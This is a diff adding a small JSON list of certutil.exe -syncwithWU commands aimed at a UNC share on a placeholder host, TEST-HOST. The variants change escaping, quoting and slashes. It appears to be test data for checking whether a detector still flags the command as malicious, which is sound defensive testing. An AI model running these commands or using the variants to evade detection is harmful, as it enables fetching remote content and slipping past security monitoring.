@@ -1,0 +1,28 @@
+```json
+[
+  {
+    "output": "certutil.exe -syncwithWU \\\\TEST-HOST\\\\share",
+    "explanation": "Added extra backslashes for escaping, which are still parsed correctly by certutil.exe."
+  },
+  {
+    "output": "certutil.exe -syncwithWU \"\\\\TEST-HOST\\\\share\"",
+    "explanation": "Wrapped the UNC path in quotes to test how the parser handles quoted arguments."
+  },
+  {
+    "output": "certutil.exe -syncwithWU \\\\TEST-HOST\\share",
+    "explanation": "Used a mix of single and double backslashes for path normalization testing."
+  },
+  {
+    "output": "certutil.exe -syncwithWU \\\\TEST-HOST/share",
+    "explanation": "Replaced backslashes with forward slashes to test path normalization behavior."
+  },
+  {
+    "output": "certutil.exe -syncwithWU \\\\TEST-HOST\\share\\",
+    "explanation": "Added an extra trailing backslash to test how the parser handles optional trailing slashes."
+  },
+  {
+    "output": "certutil.exe -syncwithWU \\\\TEST-HOST\\share\\file.txt",
+    "explanation": "Appended a dummy file name to test if the parser still identifies the command as malicious."
+  }
+]
+```
